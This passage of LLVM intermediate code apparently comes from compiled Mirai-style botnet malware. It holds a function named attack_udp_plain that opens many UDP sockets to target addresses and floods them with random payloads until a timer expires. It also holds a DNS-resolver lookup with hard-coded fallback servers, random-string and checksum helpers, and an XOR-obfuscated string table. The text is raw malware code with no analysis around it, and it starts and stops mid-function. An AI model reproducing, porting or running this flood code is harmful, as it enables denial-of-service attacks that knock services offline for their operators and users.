  %11 = call i8* @table_retrieve_val(i32 41, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 41)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 42)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 42, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 42)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %84

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

; <label>:69:                                     ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* %70, i8* %74, i32 %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

; <label>:83:                                     ; preds = %64
  br label %84

; <label>:84:                                     ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30

; <label>:87:                                     ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %92 = call i32 @inet_addr(i8* %91) #6
  store i32 %92, i32* %1, align 4
  br label %106

; <label>:93:                                     ; preds = %87
  br label %94

; <label>:94:                                     ; preds = %93, %15
  br label %95

; <label>:95:                                     ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

; <label>:98:                                     ; preds = %95
  %99 = call i32 @htonl(i32 134744072) #7
  store i32 %99, i32* %1, align 4
  br label %106

; <label>:100:                                    ; preds = %95
  %101 = call i32 @htonl(i32 1246898730) #7
  store i32 %101, i32* %1, align 4
  br label %106

; <label>:102:                                    ; preds = %95
  %103 = call i32 @htonl(i32 1074151430) #7
  store i32 %103, i32* %1, align 4
  br label %106

; <label>:104:                                    ; preds = %95
  %105 = call i32 @htonl(i32 67240450) #7
  store i32 %105, i32* %1, align 4
  br label %106

; <label>:106:                                    ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %19, align 4
  %56 = load i16, i16* %15, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %5
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %15, align 2
  br label %65

; <label>:62:                                     ; preds = %5
  %63 = load i16, i16* %15, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %15, align 2
  br label %65

; <label>:65:                                     ; preds = %62, %59
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %178, %65
  %67 = load i32, i32* %11, align 4
  %68 = load i8, i8* %7, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %67, %69
  br i1 %70, label %71, label %181

; <label>:71:                                     ; preds = %66
  %72 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %73 = load i8**, i8*** %12, align 8
  %74 = load i32, i32* %11, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %73, i64 %75
  store i8* %72, i8** %76, align 8
  %77 = load i16, i16* %14, align 2
  %78 = zext i16 %77 to i32
  %79 = icmp eq i32 %78, 65535
  br i1 %79, label %80, label %89

; <label>:80:                                     ; preds = %71
  %81 = call i32 @rand_next()
  %82 = trunc i32 %81 to i16
  %83 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 0
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %87, i32 0, i32 1
  store i16 %82, i16* %88, align 2
  br label %98

; <label>:89:                                     ; preds = %71
  %90 = load i16, i16* %14, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %90) #7
  %92 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %93 = load i32, i32* %11, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 0
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %96, i32 0, i32 1
  store i16 %91, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %89, %80
  %99 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %100 = load i32*, i32** %13, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  store i32 %99, i32* %103, align 4
  %104 = icmp eq i32 %99, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %224

; <label>:106:                                    ; preds = %98
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %107, align 4
  %108 = load i16, i16* %15, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %108, i16* %109, align 2
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %110, i32 0, i32 0
  store i32 0, i32* %111, align 4
  %112 = load i32*, i32** %13, align 8
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %118 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %118, %struct.sockaddr** %117, align 8
  %119 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %120 = load %struct.sockaddr*, %struct.sockaddr** %119, align 8
  %121 = call i32 @bind(i32 %116, %struct.sockaddr* %120, i32 16) #6
  %122 = icmp eq i32 %121, -1
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %106
  br label %124

; <label>:124:                                    ; preds = %123, %106
  %125 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %126 = load i32, i32* %11, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i64 %127
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %128, i32 0, i32 2
  %130 = load i8, i8* %129, align 4
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %131, 32
  br i1 %132, label %133, label %159

; <label>:133:                                    ; preds = %124
  %134 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %135 = load i32, i32* %11, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #7
  %141 = call i32 @rand_next()
  %142 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i32 0, i32 2
  %147 = load i8, i8* %146, align 4
  %148 = zext i8 %147 to i32
  %149 = lshr i32 %141, %148
  %150 = add i32 %140, %149
  %151 = call i32 @htonl(i32 %150) #7
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 0
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %156, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %151, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %133, %124
  %160 = load i32*, i32** %13, align 8
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %166 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 0
  %171 = bitcast %struct.sockaddr_in* %170 to %struct.sockaddr*
  store %struct.sockaddr* %171, %struct.sockaddr** %165, align 8
  %172 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %173 = load %struct.sockaddr*, %struct.sockaddr** %172, align 8
  %174 = call i32 @connect(i32 %164, %struct.sockaddr* %173, i32 16)
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %159
  br label %177

; <label>:177:                                    ; preds = %176, %159
  br label %178

; <label>:178:                                    ; preds = %177
  %179 = load i32, i32* %11, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %11, align 4
  br label %66

; <label>:181:                                    ; preds = %66
  br label %182

; <label>:182:                                    ; preds = %223, %181
  store i32 0, i32* %11, align 4
  br label %183

; <label>:183:                                    ; preds = %214, %182
  %184 = load i32, i32* %11, align 4
  %185 = load i8, i8* %7, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  br i1 %187, label %188, label %217

; <label>:188:                                    ; preds = %183
  %189 = load i8**, i8*** %12, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %25, align 8
  %194 = load i8, i8* %17, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %204

; <label>:196:                                    ; preds = %188
  %197 = load i8*, i8** %25, align 8
  %198 = load i16, i16* %16, align 2
  %199 = zext i16 %198 to i32
  call void @rand_alpha_str(i8* %197, i32 %199)
  %200 = load i8*, i8** %25, align 8
  %201 = load i16, i16* %16, align 2
  %202 = zext i16 %201 to i64
  %203 = getelementptr inbounds i8, i8* %200, i64 %202
  store i8 0, i8* %203, align 1
  br label %204

; <label>:204:                                    ; preds = %196, %188
  %205 = load i32*, i32** %13, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = load i8*, i8** %25, align 8
  %211 = load i16, i16* %16, align 2
  %212 = zext i16 %211 to i64
  %213 = call i64 @send(i32 %209, i8* %210, i64 %212, i32 16384)
  br label %214

; <label>:214:                                    ; preds = %204
  %215 = load i32, i32* %11, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %11, align 4
  br label %183

; <label>:217:                                    ; preds = %183
  %218 = call i64 @time(i64* null) #6
  %219 = load i32, i32* %19, align 4
  %220 = sext i32 %219 to i64
  %221 = icmp sgt i64 %218, %220
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %217
  br label %224

; <label>:223:                                    ; preds = %217
  br label %182

; <label>:224:                                    ; preds = %222, %105
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

; <label>:29:                                     ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #7
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [64 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 39)
  %6 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 39, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

; <label>:13:                                     ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i32 0, i32 0
  %16 = call i32 @util_strlen(i8* %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9

; <label>:23:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 39)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
